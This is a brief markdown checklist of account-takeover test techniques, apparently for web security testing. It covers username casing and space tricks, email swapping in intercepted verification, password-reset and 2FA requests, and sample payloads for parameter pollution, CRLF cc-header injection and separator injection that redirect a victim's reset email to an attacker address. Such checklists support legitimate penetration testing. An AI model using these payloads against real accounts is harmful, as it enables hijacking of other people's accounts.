# Account takeover

## Registration
Try to register a new user by appending or prepending spaces or changing casing to
the username/email, example `johndoe` -> ` johndoe` or `johndoe` -> `jOhNDoe`

## Login
Same thing as with registration

## Email verification
* Signup with your email
* Open email verification link
* Set the password
* Capture the request in burp
* Replace your email with the victim one

## Password reset
* Request password reset for your account
* Open the link sent in your email
* Intercept the reset password request
* Replace your email with another one

## 2FA
* Login with your account
* Server ask you for a token
* Intercept the request with your token
* Replace your mail with another one

## Parameter pollution
Try to add a second parameter to a reset password request to test the server
validation:
```
email=victim@xyz.tld&email=attacker@xyz.tld
```

## Carbon copy
Try to get a copy of the mail containing the reset password in you inbox by
using the carbon copy functionality of mail:
```
email=victim@xyz.tld%0a%0dcc:attacker@xyz.tld
```

## Separators
Add separators to a reset password request in order to try to get a copy of the
reset mail to your inbox:
```
email=victim@xyz.tld,attacker@xyz.tld
email=victim@xyz.tld%20attacker@xyz.tld
email=victim@xyz.tld|attacker@xyz.tld
{"email": ["victim@xyz.tld","attacker@xyz.tld"]}
```
